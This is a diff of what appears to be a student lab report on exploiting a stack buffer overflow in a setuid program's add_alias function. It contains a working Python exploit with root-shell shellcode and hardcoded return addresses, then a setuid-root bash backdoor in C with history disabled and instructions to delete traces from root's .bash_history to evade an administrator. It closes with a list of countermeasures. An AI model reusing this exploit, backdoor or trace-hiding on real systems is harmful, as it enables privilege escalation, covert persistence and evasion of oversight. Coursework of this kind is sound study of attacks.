@@ -1,24 +1,24 @@
 # Report Lab 2
 
-## How our exploit works
+### How our exploit works
 
 Our exploit overwrites the return address of `add_alias` to point towards a nopslide which runs into shellcode that opens up a shell with root access. The shell has root access due to that addhost that runs the exploit has the setuid bit set and root is owner.
 
-## How we came up with our exploit
+### How we came up with our exploit
 
-We constructed a string in the python script `exploit.py` which adds a nopslide, the exploit, and an address together. The goal was for our string to overwrite the return address of the function `add_alias` when it used our malicious string in its buffer. The reason we are able to overwrite the return address by using this buffer is because the function used to fill the buffer, `sprintf`, doesn't limit the amount of character written to the buffer, in contrast to `sprintf`.
+We constructed a string in the python script `exploit.py` which adds a nopslide, the exploit, and an address together. The goal was for our string to overwrite the return address of the function `add_alias` when it used our malicious string, provided as an argument, in its buffer. The reason we are able to overwrite the return address by using this buffer is because the function used to fill the buffer, `sprintf`, doesn't limit the amount of character written to the buffer, in contrast to `snprintf`.
 
-In order to find out how long our malicious string needed to be in order for the last character to overwrite the return address we ran the program in gdb with the alphabet as our input argument instead of of malicious string. We could then use "info frame" in order to check which character had overwritten the return address, allowing us to know the needed length of our malicious string. This length turned out to be 261 characters. Since the shellcode is 75 characters, we used 185 characters for the nopslide, and the final character was the address we overwrote the return address with.
+In order to find out how long our malicious string needed to be in order for the last character to overwrite the return address we ran the program in gdb with the alphabet ("AAAABBBB..." repeated 3-4 times on different trials) as our input argument instead of of malicious string. We could then use "info frame" in order to check which character had overwritten the return address, allowing us to know the needed length of our malicious string. This length turned out to be 261 characters. Since the shellcode is 75 characters, we used 185 characters for the nopslide, and the final character was the address we overwrote the return address with.
 
 Since our malicious string is read into the buffer, it will exist in both args and local variables in the memory. We also used gdb to find out where the local variables are so that we could overwrite the return address with the address pointing towards local variables. Due to environmental differences caused by gdb and ssh we tried both higher and lower values than what gdb said. We ended up with 0xbffffa80 for ssh and 0xbffff9b4 for running locally in the vm.
 
-## How to run the exploit
+### How to run the exploit
 run 
 ```bash
 addhostalias "$(python exploit.py)" a a
 ```
 
-## Screenshots
+### Screenshots
 Using gdb in order to find the memory address of locals.
 
 ![alt text](image.png)
@@ -26,3 +26,64 @@ Using gdb in order to find the memory address of locals.
 Running the exploit
 
 ![alt text](image-1.png)
+
+### Script
+```py
+import struct
+shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
+            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
+            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
+            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
+            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
+            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
+            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')
+
+
+# |---- Is of by one for some reason
+# V 
+eip = struct.pack("I",0xbffffa80) 
+# Length of the shell-code hex is 75, hence we need to subtract it from the approx length of buffer
+# Length of buffer found by trial and error in GDB
+nopslide = "\x90"*(260-75)
+print(nopslide+shellcode+eip)
+```
+
+### Persistent root access
+To gain persistance, we wrote a program to open bash that we compiled on dvader. Then we used the exploit to get root shell access to run:
+```bash
+chown root program
+chmod 4755 program
+```
+This changes the program's owner to root and sets the SUID bit. Basically anyone who runs the program runs it with the priviledges of 
+the owner, in this case root. Which results in a root shell. Apparently bash ignores effective user ID when it's started with `execve`, that's why we use `setreuid(0,0)` which sets both effective and real UID to root.
+
+To hide the persistant access from an admin, `setenv()` is used to make bash not storing the command history. The only manual thing that has to be done is removing the traces of `chown` and `chmod` from root's `.bash_history`. Which can be done from the "no history" shell once it's setup.
+
+```c
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+        char *args[] = {"/bin/bash", NULL};
+        setenv("HISTFILE", "/dev/null", 1);
+        setenv("HISTSIZE", "0", 1);
+        setreuid(0,0);
+
+        execve("/bin/bash", args, NULL);
+        return(0);
+}
+```
+
+### Hints
+A comment about hints and resources. We primarily used the `.bash_history` file on dvader and the provided video material as inspiration for out exploit. Extensive googling and a hex calculator was also used.
+
+### Instructions
+As mentioned previously, the main vulnerability is that the special user id bit is set for the binary and that root is owner. This means that the program is run with root priviledges, and any process that spawns from it can have the same level of priviledges. One important point that the shellcode comments make are the lack of NULL bytes, this is because it's a string terminator on unix and if it is included in the argument, it terminates it. Therefore not including the rest of the exploit. That's why instead of writing a zero (\00) to a register (to set the UID bit to 0) the register is xor'd with itself ("\x31\xc0"). 
+
+### Countermeasures
+- Language: If `snprinf` takes the size of the buffer as an argument, preventing buffer overflows. If it was used instead of `sprintf` then the exploit would not be possible. Using a static analyzer like Clang would help in detecting similar issues.
+
+- Run-time: Using the fstack-protector flag makes the compiler implement canaries after buffers meaning that the buffer overflow would be detected during run-time.
+
+- OS: Address obfuscation can be used in order to make it more difficult to know what to set the return address to. You can also change the file permissions such that only root users can execute the program. If the point of the program is to allow non-root users to add host aliases then this countermeasure would defy the programs reason to exist.
